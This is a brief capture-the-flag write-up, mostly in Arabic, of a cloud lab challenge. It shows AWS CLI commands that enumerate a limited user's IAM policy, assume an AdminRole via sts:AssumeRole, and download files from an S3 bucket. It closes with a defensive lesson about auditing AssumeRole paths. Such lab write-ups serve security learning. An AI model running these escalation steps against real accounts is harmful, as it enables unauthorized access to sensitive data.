# pwned-labs-write-up-Breach-in-the-clould-
**this is my simple wirte up of clould security ctf style challenges**
**IAM privilege escalation**

first login in awscli with your credentials with **aws configure**

### 1. الـ Entry Point

اللاب يبدأ بـ AWS credentials لمستخدم محدود:

```text
temp-user
```

الفكرة إن الـ credentials دي **مش Admin credentials**، لذلك أول خطوة هي معرفة هو يقدر يعمل إيه.

```bash
aws sts get-caller-identity
```

ثم:

```bash
aws iam list-user-policies --user-name temp-user
```

ولمعرفة محتوى الـ policy:

```bash
aws iam get-user-policy \
  --user-name temp-user \
  --policy-name test-temp-user
```

---

### 2. اكتشاف الـ Privilege Escalation

داخل الـ policy نبحث عن صلاحية مهمة مثل:

```text
sts:AssumeRole
```

دي معناها إن `temp-user` يستطيع طلب credentials مؤقتة لـ IAM Role معيّن.

في التحدي الـ Role المهم هو:

```text
AdminRole
```

وبالتالي المسار أصبح:

```text
temp-user
    ↓
sts:AssumeRole
    ↓
AdminRole
```

وده هو جوهر **IAM Privilege Escalation** في التحدي.

---

### 3. تنفيذ AssumeRole

نستخدم:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::107513503799:role/AdminRole \
  --role-session-name MySession
```

AWS ترجع Temporary Credentials:

```text
AccessKeyId
SecretAccessKey
SessionToken
```

لازم تستخدم **الثلاثة من نفس نتيجة `AssumeRole`**.
يعني تسجل دخول تاني ببيانات الادمن الجديده عن طريق الامردا aws configure
بعد ضبطهم:

```bash
aws sts get-caller-identity
```

المفروض الـ identity أصبحت مرتبطة بالـ Role بدل المستخدم الأصلي.

---

### 4. الوصول إلى S3

بعد الحصول على صلاحيات الـ Role:

```bash
aws s3 ls s3://emergency-data-recovery
```

فتجد:

```text
emergency.txt
message.txt
```

---

### 5. تنزيل الملفات

```bash
aws s3 cp s3://emergency-data-recovery/emergency.txt .
```

و:

```bash
aws s3 cp s3://emergency-data-recovery/message.txt .
```

ثم:

```bash
cat emergency.txt
cat message.txt
```

وهنا تصل للبيانات/الـ flag الخاصة بالتحدي.

---

## 🧠 الخلاصة الأمنية

الثغرة ليست في S3 نفسه.

المشكلة الأساسية هي **IAM privilege escalation**:

```text
Low-privileged User
       │
       │ sts:AssumeRole
       ▼
    AdminRole
       │
       │ elevated permissions
       ▼
       S3
       │
       ▼
Sensitive Data
```

يعني المستخدم بدأ بصلاحيات محدودة، لكن وجود `sts:AssumeRole` مع إمكانية الوصول إلى `AdminRole` سمح له بالانتقال إلى صلاحيات أعلى.

**الدرس المهم:** في AWS، لما تعمل مراجعة IAM، ما تبصش فقط على الصلاحيات المباشرة للمستخدم؛ لازم تتتبع **مسارات الـ AssumeRole** وتشوف الـ Roles اللي المستخدم يستطيع الوصول إليها.
